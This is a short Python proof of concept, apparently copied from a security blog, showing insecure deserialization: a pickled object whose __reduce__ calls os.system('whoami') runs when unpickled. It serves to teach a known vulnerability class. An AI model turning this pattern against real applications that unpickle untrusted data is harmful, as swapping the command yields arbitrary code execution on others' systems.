#Copied from: https://www.acunetix.com/blog/articles/what-is-insecure-deserialization/

# Import dependencies
import os
import _pickle

# Attacker prepares exploit that application will insecurely deserialize
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('whoami',))

# Attacker serializes the exploit
def serialize_exploit():
    shellcode = _pickle.dumps(Exploit())
    return shellcode

# Application insecurely deserializes the attacker's serialized data
def insecure_deserialization(exploit_code):
    _pickle.loads(exploit_code)

if __name__ == '__main__':
    # Serialize the exploit
    shellcode = serialize_exploit()

    # Attacker's payload runs a `whoami` command
    insecure_deserialization(shellcode)